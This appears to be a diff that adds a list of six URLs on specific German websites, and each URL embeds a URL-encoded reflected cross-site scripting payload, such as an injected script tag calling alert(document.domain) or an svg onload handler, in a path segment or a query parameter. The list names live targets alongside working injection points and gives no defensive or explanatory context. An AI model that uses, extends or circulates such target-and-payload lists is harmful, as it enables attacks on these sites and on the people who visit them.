@@ -1,0 +1,6 @@
+http://businessclub-schloss-solitude.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+https://butzbach-suche.de/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+https://buw-saalfeld.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://buxtehude-kurier.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://buyword.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://cable360.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
